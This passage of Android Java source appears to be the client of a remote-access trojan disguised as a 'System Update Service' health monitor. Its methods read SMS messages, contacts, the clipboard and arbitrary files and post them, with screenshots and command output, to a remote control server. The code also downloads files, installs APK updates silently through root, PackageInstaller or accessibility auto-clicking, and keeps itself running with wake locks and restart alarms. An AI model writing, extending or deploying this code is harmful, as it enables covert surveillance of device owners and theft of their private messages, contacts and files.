                if (cd != null && cd.getItemCount() > 0) {
                    CharSequence t = cd.getItemAt(0).coerceToText(this);
                    result = t != null ? t.toString() : "(null)";
                }
            } catch (Exception e) { result = "clip error: " + e.getMessage(); }
        }
        sendOut(id, "__clip__", enc(result != null ? result : "(empty)"));
    }

    private void doSms(String id) {
        if (checkSelfPermission("android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, "__sms__", enc("READ_SMS not granted")); return;
        }
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address","body","date"}, null, null, "date DESC");
            JSONArray arr = new JSONArray();
            int count = 0;
            if (c != null) {
                while (c.moveToNext() && count++ < 50) {
                    JSONObject m = new JSONObject();
                    m.put("from", c.getString(0)); m.put("body", c.getString(1));
                    m.put("date", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US)
                        .format(new java.util.Date(c.getLong(2))));
                    arr.put(m);
                }
                c.close();
            }
            sendOut(id, "__sms__", enc(arr.toString(2)));
        } catch (Exception e) { sendOut(id, "__sms__", enc("sms error: " + e.getMessage())); }
    }

    private void doContacts(String id) {
        if (checkSelfPermission("android.permission.READ_CONTACTS") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, "__contacts__", enc("READ_CONTACTS not granted")); return;
        }
        try {
            Cursor c = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"display_name","data1"}, null, null, "display_name ASC");
            JSONArray arr = new JSONArray();
            int count = 0;
            if (c != null) {
                while (c.moveToNext() && count++ < 100) {
                    JSONObject m = new JSONObject();
                    m.put("name", c.getString(0)); m.put("phone", c.getString(1));
                    arr.put(m);
                }
                c.close();
            }
            sendOut(id, "__contacts__", enc(arr.toString(2)));
        } catch (Exception e) { sendOut(id, "__contacts__", enc("contacts error: " + e.getMessage())); }
    }

    // ── file upload/download ───────────────────────────────────────────────────

    private void doUpload(String id, String path) {
        try {
            File f = new File(path);
            if (!f.exists()) { sendOut(id, "__upload:" + path, enc("not found: " + path)); return; }
            if (f.length() > 20 * 1024 * 1024) { sendOut(id, "__upload:" + path, enc("too large (>20MB)")); return; }
            byte[] data = readFile(f);
            JSONObject b = new JSONObject();
            b.put("did", id); b.put("name", f.getName());
            b.put("data", Base64.encodeToString(data, Base64.NO_WRAP)); b.put("size", f.length());
            post("/esp/device-file", b);
            sendOut(id, "__upload:" + path, enc("uploaded: " + f.getName() + " (" + f.length() + "B)"));
        } catch (Exception e) { sendOut(id, "__upload:" + path, enc("upload error: " + e.getMessage())); }
    }

    private void doDownload(String id, String args) {
        String[] parts = args.split("\\|", 2);
        if (parts.length != 2) { sendOut(id, "__dl:" + args, enc("format: url|/path")); return; }
        try {
            byte[] data = httpGet(parts[0], 50 * 1024 * 1024);
            File f = new File(parts[1]);
            if (f.getParentFile() != null) f.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(data); fos.close();
            sendOut(id, "__dl:" + args, enc("saved: " + parts[1] + " (" + data.length + "B)"));
        } catch (Exception e) { sendOut(id, "__dl:" + args, enc("dl error: " + e.getMessage())); }
    }

    // ── upgrade ───────────────────────────────────────────────────────────────

    private void handleUninstall(String id) {
        sendOut(id, "__uninstall__", enc("ok"));
        stopSelf();
    }

    private void doUpgrade(String id) {
        String status = "err:unknown";
        File f = new File(getCacheDir(), "upd.apk");
        try {
            byte[] apk = downloadApk();
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(apk); fos.close();

            // Method 1: root
            try {
                Process su = Runtime.getRuntime().exec(new String[]{"su", "-c",
                    "pm install -r -t " + f.getAbsolutePath()});
                su.waitFor(20, TimeUnit.SECONDS);
                if (new String(drain(su.getInputStream(), 4096)).contains("Success")) {
                    sendOut(id, "__upgrade__", enc("root_ok")); return;
                }
            } catch (Exception ignored) {}

            // Method 2: PackageInstaller (Android 12+ silent self-update)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    PackageInstaller pi = getPackageManager().getPackageInstaller();
                    PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                    params.setAppPackageName(getPackageName());
                    params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                    int sid = pi.createSession(params);
                    PackageInstaller.Session sess = pi.openSession(sid);
                    try (OutputStream out = sess.openWrite("pkg", 0, apk.length)) {
                        out.write(apk); sess.fsync(out);
                    }
                    Intent intent = new Intent("com.device.health.monitor.INSTALL_RESULT");
                    PendingIntent pend = PendingIntent.getBroadcast(this, 0, intent,
                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                    sess.commit(pend.getIntentSender()); sess.close();
                    sendOut(id, "__upgrade__", enc("pkg_installer_ok")); return;
                } catch (Exception e) { Log.d(TAG, "pkg_installer: " + e.getMessage()); }
            }

            // Method 3: FileProvider + Accessibility auto-click
            Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", f);
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setDataAndType(uri, "application/vnd.android.package-archive");
            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            status = "dialog_shown(acc_will_click)";
        } catch (Exception e) { status = "err: " + e.getMessage(); }
        sendOut(id, "__upgrade__", enc(status));
    }

    // ── helpers ────────────────────────────────────────────────────────────────

    private void sendOut(String id, String cmd, String b64out) {
        try {
            JSONObject b = new JSONObject();
            b.put("did", id); b.put("cmd", cmd); b.put("out", b64out);
            b.put("os", "Android " + Build.VERSION.RELEASE);
            post("/esp/device-cmdout", b);
        } catch (Exception ignored) {}
    }

    private String enc(String s) {
        return Base64.encodeToString(s.getBytes(), Base64.NO_WRAP);
    }

    void pushShot(String id, byte[] img) {
        try {
            JSONObject b = new JSONObject();
            b.put("did", id);
            b.put("img", Base64.encodeToString(img, Base64.NO_WRAP));
            b.put("os", "Android " + Build.VERSION.RELEASE);
            post("/esp/device-screenshot", b);
        } catch (Exception ignored) {}
    }

    private String loadId() {
        SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
        String id = p.getString("did", null);
        if (id == null) { id = UUID.randomUUID().toString(); p.edit().putString("did", id).apply(); }
        return id;
    }

    private void reg(String id) throws Exception {
        int[] wh = getScreenDims();
        JSONObject b = new JSONObject();
        b.put("did", id); b.put("hostname", Build.MANUFACTURER + " " + Build.MODEL);
        b.put("os", "Android " + Build.VERSION.RELEASE);
        b.put("user", "android"); b.put("arch", Build.SUPPORTED_ABIS[0]);
        b.put("persistent", true);
        b.put("full", isAccEnabled());
        b.put("screen_w", wh[0]);
        b.put("screen_h", wh[1]);
        post("/esp/device-register", b);
    }

    private boolean isAccEnabled() {
        try {
            String s = android.provider.Settings.Secure.getString(getContentResolver(),
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return s != null && s.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "health:sync");
                wakeLock.acquire();
            }
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); }
        catch (Exception ignored) {}
    }

    private byte[] downloadApk() throws Exception {
        return httpGet(ep() + "/apk/android-full", 10 * 1024 * 1024);
    }

    private byte[] httpGet(String url, int maxBytes) throws Exception {
        for (int i = 0; i < 5; i++) {
            URL u = new URL(url);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(30000); c.setReadTimeout(60000);
            c.setInstanceFollowRedirects(false);
            int code = c.getResponseCode();
            if (code >= 300 && code < 400) { url = c.getHeaderField("Location"); c.disconnect(); continue; }
            byte[] data = drain(c.getInputStream(), maxBytes);
            c.disconnect(); return data;
        }
        throw new Exception("too many redirects");
    }

    private JSONObject get(String path) throws Exception {
        URL u = new URL(ep() + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setConnectTimeout(8000); c.setReadTimeout(8000);
        try { return new JSONObject(new String(drain(c.getInputStream(), 65536))); }
        finally { c.disconnect(); }
    }

    private void post(String path, JSONObject data) throws Exception {
        URL u = new URL(ep() + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/json");
        c.setDoOutput(true); c.setConnectTimeout(15000); c.setReadTimeout(15000);
        try (OutputStream os = c.getOutputStream()) { os.write(data.toString().getBytes()); }
        try { c.getInputStream().close(); } catch (Exception ignored) {}
        finally { c.disconnect(); }
    }

    private byte[] drain(InputStream is, int max) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n, total = 0;
        while ((n = is.read(buf)) != -1) { b.write(buf, 0, n); total += n; if (total >= max) break; }
        return b.toByteArray();
    }

    private byte[] readFile(File f) throws IOException {
        java.io.FileInputStream fis = new java.io.FileInputStream(f);
        byte[] data = drain(fis, (int) f.length() + 1);
        fis.close();
        return data;
    }

    private byte[] cat(byte[] a, byte[] b) {
        byte[] r = new byte[a.length + b.length];
        System.arraycopy(a, 0, r, 0, a.length);
        System.arraycopy(b, 0, r, a.length, b.length);
        return r;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Sync", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false); ch.enableLights(false); ch.enableVibration(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
    }

    private void startFg() {
        Notification n = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Update Service")
            .setContentText("Checking for updates…")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true).build();
        startForeground(1, n);
    }

    private void scheduleRestart() {
        Intent i = new Intent(this, StartReceiver.class);
        i.setAction("com.device.health.monitor.RESTART");
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (am != null) am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pi);
    }
}
